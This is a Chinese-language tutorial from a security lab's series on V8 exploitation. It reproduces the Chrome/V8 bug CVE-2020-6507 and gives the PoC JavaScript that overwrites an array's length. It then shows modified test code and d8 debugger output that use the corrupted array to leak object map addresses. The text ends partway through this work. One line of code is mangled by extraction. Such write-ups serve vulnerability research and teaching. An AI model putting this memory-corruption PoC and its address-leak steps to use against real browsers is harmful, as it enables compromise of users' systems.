**作者：Hcamael@知道创宇404实验室**
**相关阅读：[从 0 开始学 V8 漏洞利用之环境搭建（一）](https://paper.seebug.org/1820/ "从 0 开始学 V8
漏洞利用之环境搭建（一）")  
[从 0 开始学 V8 漏洞利用之 V8 通用利用链（二）](https://paper.seebug.org/1821/ "从 0 开始学 V8
漏洞利用之 V8 通用利用链（二）")  
[从 0 开始学 V8 漏洞利用之 starctf 2019 OOB（三）](https://paper.seebug.org/1822/ "从 0 开始学
V8 漏洞利用之 starctf 2019 OOB（三）")**
复现CVE-2020-6507
# 信息收集
在复习漏洞前，我们首先需要有一个信息收集的阶段：
  1. 可以从Chrome的官方更新公告得知某个版本的Chrome存在哪些漏洞。
  2. 从官方更新公告上可以得到漏洞的bug号，从而在官方的issue列表获取该bug相关信息，太新的可能会处于未公开状态。
  3. 可以在Google搜索`Chrome 版本号 "dl.google.com"`，比如`chrome 90.0.4430.93 "dl.google.com"`，可以搜到一些网站有Chrome更新的新闻，在这些新闻中能获取该版本Chrome官方离线安装包。下载Chrome一定要从`dl.google.com`网站上下载。
我第二个研究的是`CVE-2020-6507`，可以从官方公告得知其chrome的bug编号为：1086890
可以很容易找到其相关信息：
受影响的Chrome最高版本为：`83.0.4103.97` 受影响的V8最高版本为：`8.3.110.9`
相关PoC：
    array = Array(0x40000).fill(1.1);
    args = Array(0x100 - 1).fill(array);
    args.push(Array(0x40000 - 4).fill(2.2));
    giant_array = Array.prototype.concat.apply([], args);
    giant_array.splice(giant_array.length, 0, 3.3, 3.3, 3.3);
    length_as_double =
        new Float64Array(new BigUint64Array([0x2424242400000000n]).buffer)[0];
    function trigger(array) {
      var x = array.length;
      x -= 67108861;
      x = Math.max(x, 0);
      x *= 6;
      x -= 5;
      x = Math.max(x, 0);
      let corrupting_array = [0.1, 0.1];
      let corrupted_array = [0.1];
      corrupting_array[x] = length_as_double;
      return [corrupting_array, corrupted_array];
    }
    for (let i = 0; i  [FastProperties]
     - prototype: 0x09ce082091e1 
    Thread 1 "d8" received signal SIGSEGV, Segmentation fault.
    ......
    pwndbg> x/32gx 0x9ce0878c139-1
    0x9ce0878c138:  0x080406e908241891 0x2424242400000000
    0x9ce0878c148:  0x00000004080404b1 0x0878c1390878c119
    0x9ce0878c158:  0x080406e9082418e1 0x000000040878c149
调试的时候，发现程序crash了，不过我们仍然可以查看内存，发现该版本的v8，已经对地址进行了压缩，我们虽然把length位改成了`0x24242424`，但是我们却也把`elements`位改成了`0x00000000`。在这个步骤的时候，我们没有泄漏过任何地址，有没有其他没办法构造一个`elements`呢。
最后发现堆地址是从低32bit地址为0x00000000开始的，后续变量可能会根据环境的问题有所变动，那么前面的值是不是低32bit地址不会变呢？
改了改测试代码，如下所示：
    $ cat test.js
    var double_array = [1.1];
    var obj = {"a" : 1};
    var obj_array = [obj];
    var f64 = new Float64Array(1);
    var bigUint64 = new BigUint64Array(f64.buffer);
    function ftoi(f)
    {
      f64[0] = f;
        return bigUint64[0];
    }
    function itof(i)
    {
        bigUint64[0] = i;
        return f64[0];
    }
    array = Array(0x40000).fill(1.1);
    ......
    corrupted_array = trigger(giant_array)[1];
    %DebugPrint(double_array);
    var a = corrupted_array[0];
    console.log("a = 0x" + ftoi(a).toString(16));
结果为：
    $ ./d8 --allow-natives-syntax test.js
    DebugPrint: 0x288c089017d5: [JSArray] in OldSpace
     - map: 0x288c08241891  [FastProperties]
     - prototype: 0x288c082091e1 
     - elements: 0x288c089046ed  [PACKED_DOUBLE_ELEMENTS]
     - length: 1
     - properties: 0x288c080406e9  {
        #length: 0x288c08180165  (const accessor descriptor)
     }
     - elements: 0x288c089046ed  {
               0: 1.1
     }
    0x288c08241891: [Map]
     - type: JS_ARRAY_TYPE
     - instance size: 16
     - inobject properties: 0
     - elements kind: PACKED_DOUBLE_ELEMENTS
     - unused property fields: 0
     - enum length: invalid
     - back pointer: 0x288c08241869 
     - prototype_validity cell: 0x288c08180451 
     - instance descriptors #1: 0x288c08209869 
     - transitions #1: 0x288c082098b5 Transition array #1:
         0x288c08042eb9 : (transition to HOLEY_DOUBLE_ELEMENTS) -> 0x288c082418b9 
     - prototype: 0x288c082091e1 
     - constructor: 0x288c082090b5 
     - dependent code: 0x288c080401ed 
     - construction counter: 0
    a = 0x80406e908241891
成功泄漏出`double_array`变量的map地址，再改改测试代码：
    $ cat test.js
    ......
    length_as_double =
        new Float64Array(new BigUint64Array([0x2424242408901c75n]).buffer)[0];
    ......
    %DebugPrint(double_array);
    %DebugPrint(obj_array);
    var array_map = corrupted_array[0];
    var obj_map = corrupted_array[4];
    console.log("array_map = 0x" + ftoi(array_map).toString(16));
    console.log("obj_map = 0x" + ftoi(obj_map).toString(16));
再来看看结果：
    $ ./d8 --allow-natives-syntax test.js
    DebugPrint: 0x34f108901c7d: [JSArray] in OldSpace
     - map: 0x34f108241891  [FastProperties]
     - prototype: 0x34f1082091e1 
     - elements: 0x34f108904b95  [PACKED_DOUBLE_ELEMENTS]
     - length: 1
     - properties: 0x34f1080406e9  {
        #length: 0x34f108180165  (const accessor descriptor)
     }
     - elements: 0x34f108904b95  {
               0: 1.1
     }
    ......
    DebugPrint: 0x34f108901c9d: [JSArray] in OldSpace
     - map: 0x34f1082418e1  [FastProperties]
     - prototype: 0x34f1082091e1 
     - elements: 0x34f108904b89  [PACKED_ELEMENTS]
     - length: 1
     - properties: 0x34f1080406e9  {
        #length: 0x34f108180165  (const accessor descriptor)
     }